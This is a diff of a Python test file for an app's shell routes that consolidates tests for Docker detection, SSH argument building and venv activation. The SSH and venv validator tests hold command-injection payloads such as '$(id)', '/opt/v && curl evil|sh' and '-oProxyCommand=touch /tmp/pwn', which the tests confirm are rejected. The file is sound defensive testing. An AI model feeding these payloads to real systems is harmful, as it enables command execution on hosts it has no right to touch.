@@ -9,6 +9,7 @@ import json
 import os
 import shlex
 import signal
+import subprocess
 import sys
 from pathlib import Path
 from types import SimpleNamespace
@@ -30,8 +31,8 @@ from routes.shell_routes import (
     _reject_cross_site,
     _ssh_base_argv,
     _venv_activate_prefix,
-    DOCKER_IN_CONTAINER_HINT,
 )
+from src.host_docker_access import HOST_DOCKER_ACCESS_HINT
 from tests.helpers.unix_sockets import bound_unix_socket
 
 
@@ -454,196 +455,72 @@ async def test_terminate_pty_session_reports_a_group_it_may_not_signal(monkeypat
     assert await shell_routes._terminate_pty_session(proc) is False
 
 
-class TestFindLineBreak:
-    """Test line-break detection in byte buffers."""
-
-    def test_newline(self):
-        assert _find_line_break(b"hello\nworld") == (5, 1)
-
-    def test_crlf(self):
-        assert _find_line_break(b"hello\r\nworld") == (5, 2)
-
-    def test_cr_only(self):
-        assert _find_line_break(b"hello\rworld") == (5, 1)
-
-    def test_no_breaks(self):
-        assert _find_line_break(b"no breaks") == (-1, 0)
-
-    def test_empty(self):
-        assert _find_line_break(b"") == (-1, 0)
-
-    def test_leading_newline(self):
-        assert _find_line_break(b"\n") == (0, 1)
-
-    def test_leading_cr(self):
-        assert _find_line_break(b"\r") == (0, 1)
-
-    def test_leading_crlf(self):
-        assert _find_line_break(b"\r\n") == (0, 2)
-
-    def test_multiple_newlines(self):
-        """Should find the first one."""
-        assert _find_line_break(b"a\nb\nc") == (1, 1)
-
-    def test_cr_before_newline_not_adjacent(self):
-        """\\r at pos 2, \\n at pos 5 — not CRLF, should return \\r pos."""
-        assert _find_line_break(b"ab\rcd\n") == (2, 1)
-
-    def test_newline_before_cr(self):
-        """\\n comes before \\r — should return \\n."""
-        assert _find_line_break(b"ab\ncd\r") == (2, 1)
+def test_find_line_break_returns_first_break_and_its_width():
+    for buffer, expected in [
+        (b"no breaks", (-1, 0)),
+        (b"", (-1, 0)),
+        (b"hello\nworld", (5, 1)),
+        (b"hello\rworld", (5, 1)),
+        (b"hello\r\nworld", (5, 2)),
+        (b"a\nb\nc", (1, 1)),
+        (b"ab\rcd\n", (2, 1)),
+        (b"ab\ncd\r", (2, 1)),
+    ]:
+        assert _find_line_break(buffer) == expected, buffer
 
 
-class TestRunningInContainer:
-    """Detect whether the Odysseus process itself runs inside a container."""
-
-    def test_dockerenv_marker_present(self, tmp_path):
-        marker = tmp_path / ".dockerenv"
-        marker.write_text("")
-        assert (
-            _running_in_container(
-                dockerenv_path=str(marker),
-                cgroup_path=str(tmp_path / "missing"),
-            )
-            is True
-        )
-
-    def test_cgroup_names_a_container_runtime(self, tmp_path):
-        cgroup = tmp_path / "cgroup"
-        cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
-        assert (
-            _running_in_container(
-                dockerenv_path=str(tmp_path / "no-marker"),
-                cgroup_path=str(cgroup),
-            )
-            is True
-        )
-
-    def test_bare_host_has_neither_signal(self, tmp_path):
-        cgroup = tmp_path / "cgroup"
-        cgroup.write_text("0::/user.slice/session-1.scope\n")
-        assert (
-            _running_in_container(
-                dockerenv_path=str(tmp_path / "no-marker"),
-                cgroup_path=str(cgroup),
-            )
-            is False
-        )
-
-    def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
-        assert (
-            _running_in_container(
-                dockerenv_path=str(tmp_path / "no-marker"),
-                cgroup_path=str(tmp_path / "also-missing"),
-            )
-            is False
-        )
+def test_running_in_container_reads_dockerenv_marker_or_cgroup(tmp_path):
+    marker = tmp_path / ".dockerenv"
+    marker.write_text("")
+    docker_cgroup = tmp_path / "docker-cgroup"
+    docker_cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
+    host_cgroup = tmp_path / "host-cgroup"
+    host_cgroup.write_text("0::/user.slice/session-1.scope\n")
+    missing = str(tmp_path / "missing")
+    for dockerenv, cgroup, expected in [
+        (str(marker), missing, True),
+        (missing, str(docker_cgroup), True),
+        (missing, str(host_cgroup), False),
+        (missing, missing, False),
+    ]:
+        assert _running_in_container(dockerenv_path=dockerenv, cgroup_path=cgroup) is expected, (dockerenv, cgroup)
 
 
-class TestAppleSiliconDetection:
+def test_apple_silicon_only_on_macos_arm64(monkeypatch):
     """APFEL should only surface as available on native Apple Silicon Macs."""
+    import core.platform_compat as platform_compat
 
-    def test_reports_true_on_macos_arm64(self, monkeypatch):
-        import core.platform_compat as platform_compat
-
-        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
-        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
-        importlib.reload(platform_compat)
-
-        assert platform_compat.IS_APPLE_SILICON is True
-
-    @pytest.mark.parametrize("machine", ["x86_64", "amd64"])
-    def test_reports_false_off_apple_silicon(self, monkeypatch, machine):
-        import core.platform_compat as platform_compat
-
-        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
+    for system, machine, expected in [
+        ("Darwin", "arm64", True),
+        ("Darwin", "x86_64", False),
+        ("Linux", "arm64", False),
+    ]:
+        monkeypatch.setattr(platform_compat.platform, "system", lambda: system)
         monkeypatch.setattr(platform_compat.platform, "machine", lambda: machine)
         importlib.reload(platform_compat)
-
-        assert platform_compat.IS_APPLE_SILICON is False
-
-    def test_reports_false_on_non_macos(self, monkeypatch):
-        import core.platform_compat as platform_compat
-
-        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Linux")
-        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
-        importlib.reload(platform_compat)
-
-        assert platform_compat.IS_APPLE_SILICON is False
+        assert platform_compat.IS_APPLE_SILICON is expected, (system, machine)
 
 
-class TestDockerRowStatus:
-    """Applicability plus install hint for the docker dependency row."""
-
-    DEFAULT = "Install Docker on the selected server."
-
-    def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
+def test_docker_row_applicability_and_hint():
+    default = "Install Docker on the selected server."
+    for on_remote, in_container, installed, host_access, applicable, hint in [
+        (False, True, False, False, False, HOST_DOCKER_ACCESS_HINT),
+        (False, True, True, False, False, HOST_DOCKER_ACCESS_HINT),
+        (False, True, True, True, True, default),
+        (False, False, False, False, True, default),
+        (True, False, False, False, True, default),
+        (True, True, False, False, True, default),
+    ]:
         status = _docker_row_status(
-            on_remote=False,
-            in_container=True,
-            installed=False,
-            default_hint=self.DEFAULT,
+            on_remote=on_remote,
+            in_container=in_container,
+            installed=installed,
+            default_hint=default,
+            host_docker_access=host_access,
         )
-        assert status.applicable is False
-        assert status.install_hint == DOCKER_IN_CONTAINER_HINT
-
-    def test_in_container_cli_without_opt_in_is_not_applicable(self):
-        status = _docker_row_status(
-            on_remote=False,
-            in_container=True,
-            installed=True,
-            default_hint=self.DEFAULT,
-        )
-        assert status.applicable is False
-        assert status.install_hint == DOCKER_IN_CONTAINER_HINT
-
-    def test_in_container_opt_in_with_socket_is_applicable(self):
-        status = _docker_row_status(
-            on_remote=False,
-            in_container=True,
-            installed=True,
-            default_hint=self.DEFAULT,
-            host_docker_access=True,
-        )
-        assert status.applicable is True
-        assert status.install_hint == self.DEFAULT
-
-    def test_on_host_and_absent_stays_applicable_with_default_hint(self):
-        status = _docker_row_status(
-            on_remote=False,
-            in_container=False,
-            installed=False,
-            default_hint=self.DEFAULT,
-        )
-        assert status.applicable is True
-        assert status.install_hint == self.DEFAULT
-
-    def test_remote_server_is_always_applicable_even_when_absent(self):
-        status = _docker_row_status(
-            on_remote=True,
-            in_container=False,
-            installed=False,
-            default_hint=self.DEFAULT,
-        )
-        assert status.applicable is True
-        assert status.install_hint == self.DEFAULT
-
-    def test_remote_server_ignores_local_container_status(self):
-        status = _docker_row_status(
-            on_remote=True,
-            in_container=True,
-            installed=False,
-            default_hint=self.DEFAULT,
-        )
-        assert status.applicable is True
-        assert status.install_hint == self.DEFAULT
-
-    def test_container_hint_steers_to_remote_and_warns_on_socket(self):
-        lowered = DOCKER_IN_CONTAINER_HINT.lower()
-        assert "remote" in lowered
-        assert "socket" in lowered
-        assert "high-trust" in lowered
-        assert "docker/host-docker.yml" in lowered
+        row = (on_remote, in_container, installed, host_access)
+        assert status.applicable is applicable, row
+        assert status.install_hint == hint, row
 
 
 class TestHostDockerAccess:
@@ -659,20 +536,14 @@ class TestHostDockerAccess:
 
         assert _host_docker_access_enabled(str(socket_path)) is False
 
-    @pytest.mark.parametrize("flag", [None, "false"])
-    def test_socket_without_explicit_opt_in_is_disabled(
-        self,
-        monkeypatch,
-        flag,
-    ):
+    def test_socket_without_explicit_opt_in_is_disabled(self, monkeypatch):
         # Not tmp_path: binding under $TMPDIR overruns sun_path on macOS.
         with bound_unix_socket() as socket_path:
-            if flag is None:
-                monkeypatch.delenv("ODYSSEUS_ENABLE_HOST_DOCKER", raising=False)
-            else:
-                monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", flag)
-
+            monkeypatch.delenv("ODYSSEUS_ENABLE_HOST_DOCKER", raising=False)
             assert _host_docker_access_enabled(socket_path) is False
+            monkeypatch.setenv("ODYSSEUS_ENABLE_HOST_DOCKER", "false")
+            assert _host_docker_access_enabled(socket_path) is False
+
 
     def test_explicit_opt_in_with_unix_socket_is_enabled(
         self,
@@ -790,13 +661,23 @@ class TestPackageProbeStatus:
         assert str(user_base / "bin") in parts
         assert str(tmp_path / "home" / ".local" / "bin") in parts
 
-    def test_remote_package_probe_checks_user_install_bin(self):
-        script = _package_probe_script(["vllm"])
+    def test_remote_package_probe_finds_binary_in_user_install_bin(self, tmp_path):
+        # The script runs on the remote host; it once shipped with tab indents
+        # and raised IndentationError there, so run it for real.
+        user_bin = tmp_path / ".local" / "bin"
+        user_bin.mkdir(parents=True)
+        fake_vllm = user_bin / "vllm"
+        fake_vllm.write_text("#!/bin/sh\n")
+        fake_vllm.chmod(0o755)
 
-        assert "site.USER_BASE" in script
-        assert "os.path.expanduser('~/.local/bin')" in script
-        assert "add_user_install_bins_to_path()" in script
-        assert "shutil.which(b)" in script
+        result = subprocess.run(
+            [sys.executable, "-I", "-c", _package_probe_script(["vllm"])],
+            capture_output=True, text=True, timeout=30,
+            env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
+        )
+
+        assert result.returncode == 0, result.stderr
+        assert json.loads(result.stdout)["vllm"]["binaries"]["vllm"] == str(fake_vllm)
 
     def test_status_import_prepares_optional_dependency(self, monkeypatch):
         import routes.shell_routes as shell_routes
@@ -838,19 +719,20 @@ class TestSshBaseArgv:
     def test_custom_port_added_as_separate_argv(self):
         assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]
 
-    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
-    def test_bad_port_rejected(self, bad):
-        with pytest.raises(ValueError):
-            _ssh_base_argv("h", bad)
+    def test_bad_port_rejected(self):
+        for bad in ["0", "70000", "-1", "8a", "$(id)", "22 22"]:
+            with pytest.raises(ValueError):
+                _ssh_base_argv("h", bad)
+
 
     def test_option_injecting_host_rejected(self):
         with pytest.raises(ValueError):
             _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)
 
-    @pytest.mark.parametrize("bad", ["", "   ", None])
-    def test_empty_host_rejected(self, bad):
-        with pytest.raises(ValueError):
-            _ssh_base_argv(bad, None)
+    def test_empty_host_rejected(self):
+        for bad in ["", "   ", None]:
+            with pytest.raises(ValueError):
+                _ssh_base_argv(bad, None)
 
 
 class TestVenvActivatePrefix:
@@ -865,21 +747,10 @@ class TestVenvActivatePrefix:
         assert (
             _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
         )
-
-    @pytest.mark.parametrize(
-        "bad",
-        [
-            "/opt/v && curl evil|sh",
-            "$(id)",
-            "`id`",
-            "v;id",
-            "v\nid",
-            "v|id",
-        ],
-    )
-    def test_injection_payloads_rejected(self, bad):
-        with pytest.raises(ValueError):
-            _venv_activate_prefix(bad)
+    def test_injection_payloads_rejected(self):
+        for bad in ["/opt/v && curl evil|sh", "$(id)", "`id`", "v;id", "v\nid", "v|id"]:
+            with pytest.raises(ValueError):
+                _venv_activate_prefix(bad)
 
 
 class TestRejectCrossSite:
@@ -894,9 +765,6 @@ class TestRejectCrossSite:
             _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
         assert exc.value.status_code == 403
 
-    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
-    def test_same_origin_and_direct_nav_allowed(self, site):
-        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None
-
-    def test_missing_header_allowed(self):
-        assert _reject_cross_site(self._req({})) is None
+    def test_same_origin_direct_nav_and_missing_header_allowed(self):
+        for headers in [{"sec-fetch-site": site} for site in ["same-origin", "same-site", "none"]] + [{}]:
+            assert _reject_cross_site(self._req(headers)) is None, headers
